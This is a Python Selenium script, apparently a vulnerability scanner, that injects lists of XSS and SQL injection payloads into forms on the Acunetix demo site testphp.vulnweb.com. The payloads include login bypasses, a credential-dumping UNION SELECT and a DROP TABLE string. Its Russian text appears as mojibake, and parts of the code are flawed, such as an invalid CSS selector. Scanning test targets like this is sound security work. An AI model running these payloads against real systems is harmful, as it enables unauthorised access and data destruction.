"""
üõ°Ô∏è SECURITY TESTING SUITE
–ê–≤—Ç–æ—Ç–µ—Å—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ XSS –∏ SQL Injection —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
–¢–µ—Å—Ç–æ–≤—ã–π —Å–∞–π—Ç: http://testphp.vulnweb.com (Acunetix Test Site)
"""

import os
import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
import re

# –û—Ç–∫–ª—é—á–∞–µ–º SSL –ø—Ä–æ–≤–µ—Ä–∫—É
os.environ['WDM_SSL_VERIFY'] = '0'

# –ü–∞–ø–∫–∞ –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤
SCREENSHOTS_DIR = "security_test_screenshots"
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)


class SecurityTestSuite:
    """–ö–ª–∞—Å—Å –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π"""

    def __init__(self):
        self.driver = None
        self.wait = None
        self.base_url = "http://testphp.vulnweb.com"  # –û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Ç–µ—Å—Ç–æ–≤—ã–π —Å–∞–π—Ç Acunetix[248]
        self.test_results = []

        # XSS Payloads –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è[234][237][252]
        self.xss_payloads = [
            "<script>alert('XSS_TEST_1')</script>",
            "<img src=x onerror=alert('XSS_TEST_2')>",
            "<svg/onload=alert('XSS_TEST_3')>",
            "<iframe src=javascript:alert('XSS_TEST_4')>",
            "';alert('XSS_TEST_5');//",
            "<script>console.log('XSS_TEST_6')</script>",
            "<body onload=alert('XSS_TEST_7')>",
            "<input onfocus=alert('XSS_TEST_8') autofocus>",
            "javascript:alert('XSS_TEST_9')",
            "<marquee onstart=alert('XSS_TEST_10')>",
        ]

        # SQL Injection Payloads –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è[235][238][247]
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' UNION SELECT null,null,null--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "admin'--",
            "' OR 1=1 /*",
            "1' OR '1'='1",
            "' AND 1=0 UNION SELECT null, username, password FROM users--"
        ]

    def setup_driver(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"""
        options = Options()
        options.add_argument("--start-maximized")
        options.add_argument("--disable-web-security")
        options.add_argument("--allow-running-insecure-content")
        options.add_argument("--disable-xss-auditor")  # –û—Ç–∫–ª—é—á–∞–µ–º –≤—Å—Ç—Ä–æ–µ–Ω–Ω—É—é –∑–∞—â–∏—Ç—É –æ—Ç XSS –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è[249]
        options.add_argument("--disable-blink-features=AutomationControlled")

        # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–Ω—Å–æ–ª–∏ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è XSS
        options.add_experimental_option("detach", True)
        caps = options.to_capabilities()
        caps['goog:loggingPrefs'] = {'browser': 'ALL'}

        try:
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.wait = WebDriverWait(self.driver, 10)

            print("‚úÖ –ë—Ä–∞—É–∑–µ—Ä –¥–ª—è security testing –∑–∞–ø—É—â–µ–Ω")
            return True

        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞: {e}")
            return False

    def take_screenshot(self, name):
        """–°–æ–∑–¥–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç"""
        if self.driver:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"{name}_{timestamp}.png"
            filepath = os.path.join(SCREENSHOTS_DIR, filename)
            self.driver.save_screenshot(filepath)
            print(f"üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏: {filepath}")
            return filepath
        return None

    def check_for_alert(self, expected_text=None):
        """–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞–ª–∏—á–∏–µ JavaScript alert (–ø—Ä–∏–∑–Ω–∞–∫ —É—Å–ø–µ—à–Ω–æ–≥–æ XSS)"""
        try:
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            print(f"üö® ALERT –æ–±–Ω–∞—Ä—É–∂–µ–Ω: '{alert_text}'")

            if expected_text and expected_text in alert_text:
                print(f"‚úÖ XSS —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω: –Ω–∞–π–¥–µ–Ω –æ–∂–∏–¥–∞–µ–º—ã–π —Ç–µ–∫—Å—Ç '{expected_text}'")
                self.test_results.append(f"üî• XSS –£–Ø–ó–í–ò–ú–û–°–¢–¨: payload –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è - {expected_text}")
                alert.accept()
                return True
            else:
                alert.accept()
                return True

        except:
            return False

    def check_console_logs(self):
        """–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ª–æ–≥–∏ –∫–æ–Ω—Å–æ–ª–∏ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ XSS[240]"""
        try:
            logs = self.driver.get_log('browser')
            xss_detected = False

            for log in logs:
                message = log['message']
                if any(xss_marker in message for xss_marker in ['XSS_TEST_', 'alert', 'console.log']):
                    print(f"üîç –ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞–ø–∏—Å—å –≤ –∫–æ–Ω—Å–æ–ª–∏: {message}")
                    xss_detected = True
                    self.test_results.append(f"‚ö†Ô∏è XSS –≤ –∫–æ–Ω—Å–æ–ª–∏: {message[:100]}")

            return xss_detected

        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ª–æ–≥–æ–≤ –∫–æ–Ω—Å–æ–ª–∏: {e}")
            return False

    def test_xss_vulnerability(self, url_path="/", form_fields=None):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π"""
        print(f"\nüîç === –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï XSS –ù–ê {url_path} ===")

        target_url = f"{self.base_url}{url_path}"
        self.driver.get(target_url)
        time.sleep(2)
        self.take_screenshot(f"xss_test_{url_path.replace('/', '_')}_before")

        # –ï—Å–ª–∏ –Ω–µ —É–∫–∞–∑–∞–Ω—ã –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ –ø–æ–ª—è, –∏—â–µ–º –≤—Å–µ input –ø–æ–ª—è
        if form_fields is None:
            form_fields = self.driver.find_elements(By.CSS_SELECTOR,
                                                    "input[type='text'], input[type='search'], textarea")

        vulnerabilities_found = 0

        for field in form_fields:
            field_name = field.get_attribute('name') or field.get_attribute('id') or 'unknown_field'
            print(f"\nüéØ –¢–µ—Å—Ç–∏—Ä—É–µ–º –ø–æ–ª–µ: {field_name}")

            for i, payload in enumerate(self.xss_payloads):
                try:
                    # –û—á–∏—â–∞–µ–º –ø–æ–ª–µ –∏ –≤–≤–æ–¥–∏–º payload
                    field.clear()
                    field.send_keys(payload)

                    # –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–æ—Ä–º—É
                    submit_buttons = self.driver.find_elements(By.CSS_SELECTOR,
                                                               "input[type='submit'], button[type='submit'], button:contains('Search'), button:contains('Submit')")

                    if submit_buttons:
                        submit_buttons[0].click()
                        time.sleep(1)
                    else:
                        # –ï—Å–ª–∏ –Ω–µ—Ç –∫–Ω–æ–ø–∫–∏ submit, –ø—Ä–æ–±—É–µ–º Enter
                        from selenium.webdriver.common.keys import Keys
                        field.send_keys(Keys.RETURN)
                        time.sleep(1)

                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ alert
                    expected_text = f"XSS_TEST_{i + 1}"
                    if self.check_for_alert(expected_text):
                        vulnerabilities_found += 1
                        self.take_screenshot(f"xss_vulnerability_found_{field_name}_{i}")

                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–Ω—Å–æ–ª—å–Ω—ã–µ –ª–æ–≥–∏
                    if self.check_console_logs():
                        vulnerabilities_found += 1

                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ—Ç–æ–±—Ä–∞–∑–∏–ª—Å—è –ª–∏ payload –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
                    page_source = self.driver.page_source
                    if payload in page_source and "<script>" in payload:
                        print(f"‚ö†Ô∏è Payload –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: {payload[:50]}")
                        self.test_results.append(f"üî• XSS REFLECTED: {payload[:50]} –≤ –ø–æ–ª–µ {field_name}")
                        vulnerabilities_found += 1

                    time.sleep(0.5)  # –ù–µ–±–æ–ª—å—à–∞—è –ø–∞—É–∑–∞ –º–µ–∂–¥—É —Ç–µ—Å—Ç–∞–º–∏

                except Exception as e:
                    print(f"–û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è XSS —Å payload {i + 1}: {e}")
                    continue

        if vulnerabilities_found == 0:
            print("‚úÖ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã –≤ –¥–∞–Ω–Ω–æ–π —Ñ–æ—Ä–º–µ")
            self.test_results.append(f"‚úÖ XSS —Ç–µ—Å—Ç {url_path}: –∑–∞—â–∏—â–µ–Ω–æ")
        else:
            print(f"üö® –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ {vulnerabilities_found} –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö XSS —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π!")

        self.take_screenshot(f"xss_test_{url_path.replace('/', '_')}_after")
        return vulnerabilities_found

    def test_sql_injection_vulnerability(self, url_path="/", form_fields=None):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL Injection —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π"""
        print(f"\nüíâ === –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï SQL INJECTION –ù–ê {url_path} ===")

        target_url = f"{self.base_url}{url_path}"
        self.driver.get(target_url)
        time.sleep(2)
        self.take_screenshot(f"sql_test_{url_path.replace('/', '_')}_before")

        # –ò—â–µ–º –ø–æ–ª—è –¥–ª—è –≤–≤–æ–¥–∞
        if form_fields is None:
            form_fields = self.driver.find_elements(By.CSS_SELECTOR,
                                                    "input[type='text'], input[type='password'], input[type='search']")

        vulnerabilities_found = 0

        for field in form_fields:
            field_name = field.get_attribute('name') or field.get_attribute('id') or 'unknown_field'
            print(f"\nüéØ –¢–µ—Å—Ç–∏—Ä—É–µ–º SQL injection –≤ –ø–æ–ª–µ: {field_name}")

            for i, payload in enumerate(self.sql_payloads):
                try:
                    # –û—á–∏—â–∞–µ–º –∏ –≤–≤–æ–¥–∏–º SQL payload
                    field.clear()
                    field.send_keys(payload)

                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É
                    submit_buttons = self.driver.find_elements(By.CSS_SELECTOR,
                                                               "input[type='submit'], button[type='submit'], button")

                    if submit_buttons:
                        submit_buttons[0].click()
                        time.sleep(2)

                    # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –æ—Ç–≤–µ—Ç –Ω–∞ –Ω–∞–ª–∏—á–∏–µ SQL –æ—à–∏–±–æ–∫
                    page_source = self.driver.page_source.lower()
                    sql_error_indicators = [
                        "mysql_fetch", "sql syntax", "mysqli_", "mysql error",
                        "warning: mysql", "valid mysql result", "mysqlclient",
                        "postgresql", "sqlite", "oracle", "odbc", "jdbc",
                        "sqlstate", "syntax error", "invalid query", "database error"
                    ]

                    for error_indicator in sql_error_indicators:
                        if error_indicator in page_source:
                            print(f"üî• SQL ERROR –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞: '{error_indicator}' —Å payload: {payload}")
                            self.test_results.append(f"üî• SQL INJECTION: {error_indicator} - {payload[:50]}")
                            vulnerabilities_found += 1
                            self.take_screenshot(f"sql_error_{field_name}_{i}")
                            break

                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≤—Ö–æ–¥ –±–µ–∑ –ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö credentials)
                    if "welcome" in page_source or "dashboard" in page_source or "logout" in page_source:
                        if "OR '1'='1" in payload or "OR 1=1" in payload:
                            print(f"‚ö†Ô∏è –í–æ–∑–º–æ–∂–Ω—ã–π SQL Injection bypass: —É—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ —Å payload {payload}")
                            self.test_results.append(f"üî• SQL BYPASS: —É—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ - {payload[:50]}")
                            vulnerabilities_found += 1
                            self.take_screenshot(f"sql_bypass_{field_name}_{i}")

                    time.sleep(0.5)

                except Exception as e:
                    print(f"–û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è SQL Injection —Å payload {i + 1}: {e}")
                    continue

        if vulnerabilities_found == 0:
            print("‚úÖ SQL Injection —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã")
            self.test_results.append(f"‚úÖ SQL —Ç–µ—Å—Ç {url_path}: –∑–∞—â–∏—â–µ–Ω–æ")
        else:
            print(f"üö® –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ {vulnerabilities_found} –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö SQL Injection —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π!")

        self.take_screenshot(f"sql_test_{url_path.replace('/', '_')}_after")
        return vulnerabilities_found

    def test_login_security(self):
        """–°–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π —Ç–µ—Å—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –≤—Ö–æ–¥–∞"""
        print("\nüîê === –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò –õ–û–ì–ò–ù–ê ===")

        # –ò—â–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ö–æ–¥–∞
        login_paths = ["/login.php", "/admin/", "/login/", "/signin/"]

        for path in login_paths:
            try:
                self.driver.get(f"{self.base_url}{path}")
                time.sleep(2)

                # –ò—â–µ–º –ø–æ–ª—è username –∏ password
                username_field = None
                password_field = None

                try:
                    username_field = self.driver.find_element(By.CSS_SELECTOR,
                                                              "input[name*='user'], input[name*='login'], input[name*='email'], input[type='text']")
                    password_field = self.driver.find_element(By.CSS_SELECTOR,
                                                              "input[name*='pass'], input[type='password']")

                    print(f"‚úÖ –ù–∞–π–¥–µ–Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –≤—Ö–æ–¥–∞: {path}")

                    # –¢–µ—Å—Ç–∏—Ä—É–µ–º SQL Injection –≤ –ª–æ–≥–∏–Ω —Ñ–æ—Ä–º–µ
                    print("üîç –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL Injection –≤ —Ñ–æ—Ä–º–µ –≤—Ö–æ–¥–∞...")

                    dangerous_credentials = [
                        ("admin", "' OR '1'='1"),
                        ("' OR 1=1--", "password"),
                        ("admin'--", "anything"),
                        ("' OR 'a'='a", "' OR 'a'='a"),
                        ("1' OR '1'='1", "1' OR '1'='1")
                    ]

                    for username, password in dangerous_credentials:
                        try:
                            username_field.clear()
                            password_field.clear()

                            username_field.send_keys(username)
                            password_field.send_keys(password)

                            # –ò—â–µ–º –∫–Ω–æ–ø–∫—É –≤—Ö–æ–¥–∞
                            login_button = self.driver.find_element(By.CSS_SELECTOR,
                                                                    "input[type='submit'], button[type='submit'], button")
                            login_button.click()

                            time.sleep(2)

                            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                            page_source = self.driver.page_source.lower()

                            if any(success_indicator in page_source for success_indicator in
                                   ["welcome", "dashboard", "logout", "profile", "admin panel"]):
                                print(f"üî• SQL INJECTION –£–°–ü–ï–®–ï–ù! –õ–æ–≥–∏–Ω: {username}, –ü–∞—Ä–æ–ª—å: {password}")
                                self.test_results.append(f"üî• LOGIN BYPASS: {username} / {password}")
                                self.take_screenshot(f"login_bypass_success")

                            # –ü—Ä–æ–≤–µ—Ä—è–µ–º SQL –æ—à–∏–±–∫–∏
                            sql_errors = ["mysql", "sql syntax", "database error", "sqlstate"]
                            if any(error in page_source for error in sql_errors):
                                print(f"‚ö†Ô∏è SQL –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—Ö–æ–¥–µ —Å: {username} / {password}")
                                self.test_results.append(f"‚ö†Ô∏è LOGIN SQL ERROR: {username}")
                                self.take_screenshot(f"login_sql_error")

                        except Exception as e:
                            print(f"–û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –ª–æ–≥–∏–Ω–∞: {e}")
                            continue

                    # –¢–µ—Å—Ç–∏—Ä—É–µ–º XSS –≤ –ø–æ–ª—è—Ö –≤—Ö–æ–¥–∞
                    print("üîç –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ XSS –≤ —Ñ–æ—Ä–º–µ –≤—Ö–æ–¥–∞...")
                    self.test_xss_vulnerability(path, [username_field])

                    break  # –ï—Å–ª–∏ –Ω–∞—à–ª–∏ —Ä–∞–±–æ—á—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ö–æ–¥–∞, –≤—ã—Ö–æ–¥–∏–º –∏–∑ —Ü–∏–∫–ª–∞

                except:
                    continue  # –ü—Ä–æ–±—É–µ–º —Å–ª–µ–¥—É—é—â–∏–π –ø—É—Ç—å

            except:
                continue

    def test_search_functionality(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–∏—Å–∫–∞"""
        print("\nüîç === –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò –ü–û–ò–°–ö–ê ===")

        search_paths = ["/search.php", "/", "/index.php", "/search/"]

        for path in search_paths:
            try:
                self.driver.get(f"{self.base_url}{path}")
                time.sleep(2)

                # –ò—â–µ–º –ø–æ–ª–µ –ø–æ–∏—Å–∫–∞
                search_fields = self.driver.find_elements(By.CSS_SELECTOR,
                                                          "input[type='search'], input[name*='search'], input[name*='q'], input[placeholder*='search']")

                if search_fields:
                    print(f"‚úÖ –ù–∞–π–¥–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–∏—Å–∫–∞ –Ω–∞: {path}")

                    # –¢–µ—Å—Ç–∏—Ä—É–µ–º XSS –≤ –ø–æ–∏—Å–∫–µ
                    xss_found = self.test_xss_vulnerability(path, search_fields)

                    # –¢–µ—Å—Ç–∏—Ä—É–µ–º SQL Injection –≤ –ø–æ–∏—Å–∫–µ
                    sql_found = self.test_sql_injection_vulnerability(path, search_fields)

                    if xss_found > 0 or sql_found > 0:
                        print(f"üö® –ù–∞–π–¥–µ–Ω—ã —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –ø–æ–∏—Å–∫–µ –Ω–∞ {path}")

                    break

            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ–∏—Å–∫–∞ –Ω–∞ {path}: {e}")
                continue

    def run_comprehensive_security_test(self):
        """–ó–∞–ø—É—Å–∫ –ø–æ–ª–Ω–æ–≥–æ security —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è"""
        print("üõ°Ô∏è –ó–ê–ü–£–°–ö –ö–û–ú–ü–õ–ï–ö–°–ù–û–ì–û SECURITY –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø")
        print("=" * 60)
        print(f"üéØ –¶–µ–ª–µ–≤–æ–π —Å–∞–π—Ç: {self.base_url}")
        print(f"üìã XSS payloads: {len(self.xss_payloads)}")
        print(f"üíâ SQL payloads: {len(self.sql_payloads)}")
        print("=" * 60)

        if not self.setup_driver():
            return False

        try:
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º –≥–ª–∞–≤–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
            self.driver.get(self.base_url)
            time.sleep(3)
            self.take_screenshot("00_target_site_loaded")

            # –ó–∞–ø—É—Å–∫–∞–µ–º –≤—Å–µ —Ç–µ—Å—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
            self.test_search_functionality()
            self.test_login_security()

            # –¢–µ—Å—Ç–∏—Ä—É–µ–º –¥—Ä—É–≥–∏–µ –≤–æ–∑–º–æ–∂–Ω—ã–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            test_pages = ["/", "/search.php", "/categories.php", "/artists.php"]

            for page in test_pages:
                try:
                    print(f"\nüîç –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã: {page}")
                    self.test_xss_vulnerability(page)
                    self.test_sql_injection_vulnerability(page)
                except Exception as e:
                    print(f"–û—à–∏–±–∫–∞ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ {page}: {e}")
                    continue

            # –§–∏–Ω–∞–ª—å–Ω—ã–µ —Å–∫—Ä–∏–Ω—à–æ—Ç—ã
            self.take_screenshot("99_security_testing_completed")

        except Exception as e:
            print(f"‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ security testing: {e}")
            self.take_screenshot("error_critical_security")

        finally:
            self.cleanup()
            self.print_security_report()

    def print_security_report(self):
        """–í—ã–≤–æ–¥ –æ—Ç—á–µ—Ç–∞ –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"""
        print("\n" + "=" * 60)
        print("üõ°Ô∏è –û–¢–ß–ï–¢ –ü–û –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò")
        print("=" * 60)

        vulnerabilities = [result for result in self.test_results if "üî•" in result]
        warnings = [result for result in self.test_results if "‚ö†Ô∏è" in result]
        secure_tests = [result for result in self.test_results if "‚úÖ" in result]

        print(f"üî• –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò: {len(vulnerabilities)}")
        print(f"‚ö†Ô∏è –ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–Ø: {len(warnings)}")
        print(f"‚úÖ –ó–ê–©–ò–©–ï–ù–ù–´–ï –ö–û–ú–ü–û–ù–ï–ù–¢–´: {len(secure_tests)}")
        print(f"üìä –í–°–ï–ì–û –ü–†–û–í–ï–†–û–ö: {len(self.test_results)}")

        if vulnerabilities:
            print(f"\nüö® –û–ë–ù–ê–†–£–ñ–ï–ù–´ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò:")
            for vuln in vulnerabilities:
                print(f"  {vuln}")

        if warnings:
            print(f"\n‚ö†Ô∏è –ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–Ø:")
            for warn in warnings:
                print(f"  {warn}")

        if len(vulnerabilities) == 0 and len(warnings) == 0:
            print("\nüéâ –ü–û–ó–î–†–ê–í–õ–Ø–ï–ú! –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ.")
            security_score = 100
        else:
            security_score = max(0, 100 - (len(vulnerabilities) * 20) - (len(warnings) * 5))

        print(f"\nüìä –û–¶–ï–ù–ö–ê –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò: {security_score}/100")

        if security_score >= 90:
            print("üü¢ –û–¢–õ–ò–ß–ù–ê–Ø –ó–ê–©–ò–¢–ê")
        elif security_score >= 70:
            print("üü° –•–û–†–û–®–ê–Ø –ó–ê–©–ò–¢–ê")
        elif security_score >= 50:
            print("üü† –°–†–ï–î–ù–Ø–Ø –ó–ê–©–ò–¢–ê")
        else:
            print("üî¥ –°–õ–ê–ë–ê–Ø –ó–ê–©–ò–¢–ê - –¢–†–ï–ë–£–ï–¢–°–Ø –í–ú–ï–®–ê–¢–ï–õ–¨–°–¢–í–û!")

        print(f"\nüì∏ –°–∫—Ä–∏–Ω—à–æ—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤: {SCREENSHOTS_DIR}")
        print("=" * 60)

    def cleanup(self):
        """–û—á–∏—Å—Ç–∫–∞ —Ä–µ—Å—É—Ä—Å–æ–≤"""
        if self.driver:
            self.driver.quit()
            print("üîí –ë—Ä–∞—É–∑–µ—Ä –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∑–∞–∫—Ä—ã—Ç")


if __name__ == "__main__":
    print("üîê SECURITY TESTING SUITE v1.0")
    print("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ XSS –∏ SQL Injection —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π")
    print("=" * 50)

    # –ó–∞–ø—É—Å–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
    security_test = SecurityTestSuite()
    security_test.run_comprehensive_security_test()

    print("\nüéØ Security —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ!")
    print("–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –æ—Ç—á–µ—Ç –≤—ã—à–µ –∏ —Å–∫—Ä–∏–Ω—à–æ—Ç—ã –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤.")
